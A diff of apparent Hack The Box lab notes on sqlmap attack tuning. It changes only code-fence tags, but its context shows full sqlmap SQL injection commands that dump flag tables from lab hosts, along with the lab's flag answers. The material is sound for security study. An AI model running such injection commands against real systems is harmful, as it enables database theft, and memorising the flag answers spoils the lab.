@@ -1,7 +1,7 @@
 # Attack Tuning
 ## Prefix/Suffix
 
-```sh
+```shellsession
 $ sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
 ```
 
@@ -33,7 +33,7 @@ Furthermore, in case there is a requirement to use an appendix at the end of a U
 ## Questions 
 1. What's the contents of table flag5? (Case #5) **Answer: HTB{700_much_r15k_bu7_w0r7h_17}**
    - The `TRUE` and `FALSE` response differs base on the text content:
-        ```sh
+        ```shellsession
         $ sqlmap -u 'http://154.57.164.79:30101/case5.php?id=1*' --text-only --batch --level 5 --risk 3 --threads 10 -T flag5 --dump
         <SNIP>
         Database: testdb
@@ -49,7 +49,7 @@ Furthermore, in case there is a requirement to use an appendix at the end of a U
 2. What's the contents of table flag6? (Case #6) **Answer: HTB{v1nc3_mcm4h0n_15_4570n15h3d}**
    - This SQL query yields a TRUE response: http://154.57.164.79:30101/case6.php?col=id`)--+
    - Feed this prefix `) into sqlmap:
-        ```sh
+        ```shellsession
         $ sqlmap -u 'http://154.57.164.79:30101/case6.php?col=id*' --text-only --batch --level 5 --risk 3 --threads 10 -T flag6 --dump --prefix="\`)"
         <SNIP>
         Database: testdb
@@ -64,7 +64,7 @@ Furthermore, in case there is a requirement to use an appendix at the end of a U
         ```
 3. What's the contents of table flag7? (Case #7) **Answer: HTB{un173_7h3_un173d}**
    - Specify UNION based technique with 5 columns and string as the value for the injection:
-        ```sh
+        ```shellsession
         $ sqlmap -u 'http://154.57.164.79:30101/case7.php?id=1*' --text-only --batch --level 5 --risk 3 --threads 10 --technique=U --union-cols=5 --union-char='a' -T flag7 --dump
         <SNIP>
         Database: testdb
